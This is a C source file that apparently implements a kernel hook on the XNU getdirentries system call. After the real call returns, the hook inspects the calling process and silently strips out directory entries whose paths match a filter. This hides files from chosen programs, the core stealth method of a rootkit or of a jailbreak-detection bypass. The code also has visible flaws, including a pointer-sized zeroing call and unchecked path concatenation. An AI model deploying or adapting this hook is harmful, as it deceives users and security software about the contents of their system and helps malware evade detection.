#include <kern/kern_func.h>
#include <utils/helpers.h>
#include <filter/filters.h>
#include <utils/vnode_func.h>
#include "getdirentries_hook.h"


int (*getdirentries_common_orig)(int fd, void *bufp, size_t bufsize, ssize_t *bytesread,
		                     off_t *offset, int *eofflag, int flags);

int getdirentries_common(int fd, void *bufp, size_t bufsize, ssize_t *bytesread,
		                     off_t *offset, int *eofflag, int flags) {
    // get ret value first
    int ret = 0;
    ret = getdirentries_common_orig(fd, bufp, bufsize, bytesread, offset, eofflag, flags);
    if (ret) return ret;

    // other process bypass
    char *caller_name = NULL;
    caller_name = log_get_caller("getdirent", "(unk)", 0);
    if(!caller_name)
        goto orig;
    if (!check_caller(caller_name)) goto orig;
    //goto orig; 
    
    // get fd's path
    int retval = 0;
    char rootpath[1024]; _bzero(rootpath, sizeof(rootpath));
    int pathlen = sizeof(rootpath);
    
    void *vp = vnode_getfromfd(fd);
    void *ctx = vfs_context_current();
    //void *vp = vnode_getfromfd_ctx(fd, ctx);
    
    //xprintf("got vp %x\n", vp);
    if (!vp) goto orig;
    //vnode_put(vp); goto orig;
#define BUILDPATH_NO_FS_ENTER 0x1
    ret = build_path_with_parent(vp, NULL, rootpath, pathlen, &pathlen, NULL, 0, ctx);
    //safe_getpath_new(vp, )
    vnode_put(vp);
    xprintf("got getdirent ret: %d path: %s\n", ret, rootpath);
    if (ret) goto orig;
    //goto orig;

    // copy ret buffer 
    //if (bufsize > 1024 * 1024 * 2) return 22;
    char *oribuf = unified_kalloc(*bytesread); _bzero(oribuf, sizeof(oribuf));
    xprintf("got %d of %d buf\n", *bytesread, bufsize);
    copyin(bufp, oribuf, *bytesread);

    //xprintf("copied from %x to %x\n", bufp, oribuf);
    //unified_kfree(oribuf); goto orig;

    // filter directory
    char *newbuf = unified_kalloc(*bytesread);
    //xprintf("alloc newbuf!\n", 0);
    int curpos = 0, newpos = 0;
    while (curpos < *bytesread) {
    	struct dirent *dirp = (struct dirent *)&oribuf[curpos];
        curpos += dirp->d_reclen;
        //xprintf("handling d_name: %s\n", dirp->d_name);

        char curpath[sizeof(rootpath)]; _bzero(curpath, sizeof(curpath));
        _memcpy(curpath, rootpath, sizeof(rootpath));
        _memcpy(curpath + _strlen(rootpath), dirp->d_name, _strlen(dirp->d_name));
        //xprintf("handling path: %s\n", curpath);
        
        if (!check_path(curpath)) {
            _memcpy(newbuf + newpos, dirp, dirp->d_reclen);
            newpos += dirp->d_reclen;
        } else {
            xprintf("filtering direntry: %s\n", curpath);
        }
    }

    // write out result
    unified_kfree(oribuf);
    //xprintf("writing out %d bytes\n", newpos);
    copyout(newbuf, bufp, newpos);
    //xprintf("copyout(%p, %p, %p)\n", newbuf,bufp,newpos);
    *bytesread = newpos;
    
    unified_kfree(newbuf);
    //xprintf("readdir hook finish\n", newpos);
orig:
    if (caller_name) unified_kfree(caller_name);
    return ret;
}